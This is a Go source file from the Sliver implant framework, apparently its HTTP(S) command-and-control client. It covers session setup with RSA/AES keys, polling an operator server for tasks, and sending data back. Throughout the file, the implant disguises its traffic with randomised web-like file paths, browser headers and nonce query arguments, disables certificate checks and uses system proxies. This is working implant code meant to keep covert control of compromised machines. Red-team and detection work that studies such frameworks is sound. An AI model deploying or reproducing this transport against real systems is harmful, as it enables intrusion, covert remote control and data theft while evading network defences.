package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.HTTPc2Enabled}}

// Procedural C2
// ===============
// .txt = rsakey
// .png = init
// .php = session
//  .js = poll

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	insecureRand "math/rand"
	"strings"

	"sync"
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/implant/sliver/proxy"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/pquerna/otp"
	"github.com/pquerna/otp/totp"
	"google.golang.org/protobuf/proto"
)

const (
	userAgent         = "{{GenerateUserAgent}}"
	defaultNetTimeout = time.Second * 60
	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
)

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// HTTPStartSession - Attempts to start a session with a given address
func HTTPStartSession(address string, pathPrefix string) (*SliverHTTPClient, error) {
	var client *SliverHTTPClient
	client = httpsClient(address, true)
	client.PathPrefix = pathPrefix
	err := client.SessionInit()
	if err != nil {
		// If we're using default ports then switch to 80
		if strings.HasSuffix(address, ":443") {
			address = fmt.Sprintf("%s:80", address[:len(address)-4])
		}
		client = httpClient(address, true) // Fallback to insecure HTTP
		err = client.SessionInit()
		if err != nil {
			return nil, err
		}
	}
	return client, nil
}

// SliverHTTPClient - Helper struct to keep everything together
type SliverHTTPClient struct {
	Origin     string
	PathPrefix string
	Client     *http.Client
	ProxyURL   string
	SessionKey *AESKey
	SessionID  string
}

// SessionInit - Initialize the session
func (s *SliverHTTPClient) SessionInit() error {
	publicKey := s.getPublicKey()
	if publicKey == nil {
		// {{if .Config.Debug}}
		log.Printf("Invalid public key")
		// {{end}}
		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
	}
	sKey := RandomAESKey()
	s.SessionKey = &sKey
	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("RSA encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.getSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
	req, _ := http.NewRequest(method, uri.String(), body)
	req.Header.Set("User-Agent", userAgent)
	if method == http.MethodGet {
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept", acceptHeaderValue)
	}
	if uri.Scheme == "http" {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	return req
}

func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
	values := uri.Query()
	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	// {{if .Config.Debug}}
	log.Printf("Encoder nonce %d", value)
	// {{end}}
	argValue := fmt.Sprintf("%d", value)
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(argValue))
		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
		argValue = argValue[:index] + char + argValue[index:]
	}
	values.Add(string(key), argValue)
	uri.RawQuery = values.Encode()
	return uri
}

func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
	values := uri.Query()
	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(value))
		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
		value = value[:index] + char + value[index:]
	}
	values.Add(string([]byte{key1, key2}), value)
	uri.RawQuery = values.Encode()
	return uri
}

func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
	uri := s.txtURL()
	nonce, encoder := encoders.RandomTxtEncoder()
	s.NonceQueryArgument(uri, nonce)
	otpCode := getOTPCode()
	s.OTPQueryArgument(uri, otpCode)

	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}

	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] Failed to fetch server public key: %v", err)
		// {{end}}
		return nil
	}
	// {{if .Config.Debug}}
	log.Printf("[http] <- %d Server key response", resp.StatusCode)
	// {{end}}
	respData, _ := ioutil.ReadAll(resp.Body)
	data, err := encoder.Decode(respData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] Failed to decode response: %s", err)
		// {{end}}
		return nil
	}
	pubKeyBlock, _ := pem.Decode(data)
	if pubKeyBlock == nil {
		// {{if .Config.Debug}}
		log.Printf("[http] Failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		// {{if .Config.Debug}}
		log.Printf("[http] Got a valid public key")
		// {{end}}
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Config.Debug}}
	log.Printf("[http] Invalid certificate %v", err)
	// {{end}}
	return nil
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
	nonce, encoder := encoders.RandomEncoder()
	payload := encoder.Encode(sessionInit)
	reqBody := bytes.NewReader(payload) // Already RSA encrypted

	uri := s.phtmlURL()
	s.NonceQueryArgument(uri, nonce)
	otpCode := getOTPCode()
	s.OTPQueryArgument(uri, otpCode)
	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}

	resp, err := s.Client.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("send failed")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	data, err := encoder.Decode(respData)
	if err != nil {
		return err
	}
	sessionID, err := GCMDecrypt(*s.SessionKey, data)
	if err != nil {
		return err
	}
	s.SessionID = string(sessionID)
	// {{if .Config.Debug}}
	log.Printf("[http] New session id: %v", s.SessionID)
	// {{end}}
	return nil
}

// Poll - Perform an HTTP GET request
func (s *SliverHTTPClient) Poll() ([]byte, error) {
	if s.SessionID == "" || s.SessionKey == nil {
		return nil, errors.New("no session")
	}
	uri := s.jsURL()
	nonce, encoder := encoders.RandomEncoder()
	s.NonceQueryArgument(uri, nonce)
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return nil, errors.New("Non-200 response code")
	}
	if resp.StatusCode == 403 {
		// {{if .Config.Debug}}
		log.Printf("Server responded with invalid session for %v", s.SessionID)
		// {{end}}
		return nil, errors.New("invalid session")
	}
	var data []byte
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if 0 < len(respData) {
		data, err = encoder.Decode(respData)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Decoding failed %s", err)
			// {{end}}
			return nil, err
		}
	}
	return GCMDecrypt(*s.SessionKey, data)
}

// Send - Perform an HTTP POST request
func (s *SliverHTTPClient) Send(data []byte) error {
	if s.SessionID == "" || s.SessionKey == nil {
		return errors.New("no session")
	}
	reqData, err := GCMEncrypt(*s.SessionKey, data)

	uri := s.phpURL()
	nonce, encoder := encoders.RandomEncoder()
	s.NonceQueryArgument(uri, nonce)
	reader := bytes.NewReader(encoder.Encode(reqData))

	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}

	req := s.newHTTPRequest(http.MethodPost, uri, reader)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] POST failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("{{if .Config.Debug}}HTTP send failed (non-200 resp){{end}}")
	}
	return nil
}

func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
	for index, segment := range segments {
		segments[index] = url.PathEscape(segment)
	}
	if s.PathPrefix != "" {
		segments = append([]string{s.PathPrefix}, segments...)
	}
	return strings.Join(segments, "/")
}

func (s *SliverHTTPClient) jsURL() *url.URL {
	curl, _ := url.Parse(s.Origin)

	segments := []string{
		// {{range .HTTPC2Config.JsPaths}}
		"{{.}}",
		// {{end}}
	}
	filenames := []string{
		// {{range .HTTPC2Config.JsFiles}}
		"{{.}}",
		// {{end}}
	}

	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
	return curl
}

func (s *SliverHTTPClient) pngURL() *url.URL {
	curl, _ := url.Parse(s.Origin)

	segments := []string{
		// {{range .HTTPC2Config.PngPaths}}
		"{{.}}",
		// {{end}}
	}
	filenames := []string{
		// {{range .HTTPC2Config.PngFiles}}
		"{{.}}",
		// {{end}}
	}

	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
	return curl
}

func (s *SliverHTTPClient) phpURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
	segments := []string{
		// {{range .HTTPC2Config.PhpPaths}}
		"{{.}}",
		// {{end}}
	}
	filenames := []string{
		// {{range .HTTPC2Config.PhpFiles}}
		"{{.}}",
		// {{end}}
	}
	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
	return curl
}

func (s *SliverHTTPClient) phtmlURL() *url.URL {
	curl := s.phpURL()
	curl, _ = url.Parse(strings.Replace(curl.String(), ".php", ".phtml", 1))
	return curl
}

func (s *SliverHTTPClient) txtURL() *url.URL {
	curl, _ := url.Parse(s.Origin)
	segments := []string{
		// {{range .HTTPC2Config.TxtPaths}}
		"{{.}}",
		// {{end}}
	}
	filenames := []string{
		// {{range .HTTPC2Config.TxtFiles}}
		"{{.}}",
		// {{end}}
	}
	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
	return curl
}

// Must return at least a file name, path segments are optional
func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
	genSegments := []string{}
	if 0 < len(segments) {
		n := insecureRand.Intn(len(segments)) // How many segments?
		for index := 0; index < n; index++ {
			seg := segments[insecureRand.Intn(len(segments))]
			genSegments = append(genSegments, seg)
		}
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string, useProxy bool) *SliverHTTPClient {
	httpTransport := &http.Transport{
		Dial:                proxy.Direct.Dial,
		TLSHandshakeTimeout: defaultNetTimeout,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("http://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   defaultReqTimeout,
			Transport: httpTransport,
		},
	}
	if useProxy {
		p := proxy.NewProvider("").GetHTTPProxy(client.Origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "http"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			httpTransport.Proxy = http.ProxyURL(proxyURL)
			client.ProxyURL = proxyURL.String()
		}
	}
	return client
}

func httpsClient(address string, useProxy bool) *SliverHTTPClient {
	netTransport := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: defaultNetTimeout,
		}).Dial,
		TLSHandshakeTimeout: defaultNetTimeout,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("https://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   defaultReqTimeout,
			Transport: netTransport,
		},
	}
	if useProxy {
		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			netTransport.Proxy = http.ProxyURL(proxyURL)
			client.ProxyURL = proxyURL.String()
		}
	}
	return client
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

func getOTPCode() string {
	now := time.Now().UTC()
	opts := totp.ValidateOpts{
		Digits:    8,
		Algorithm: otp.AlgorithmSHA256,
		Period:    uint(30),
		Skew:      uint(1),
	}
	code, _ := totp.GenerateCodeCustom("{{ .OTPSecret }}", now, opts)
	// {{if .Config.Debug}}
	log.Printf("HTTP(S) TOTP Code: %s", code)
	// {{end}}
	return code
}

// {{end}} -HTTPc2Enabled
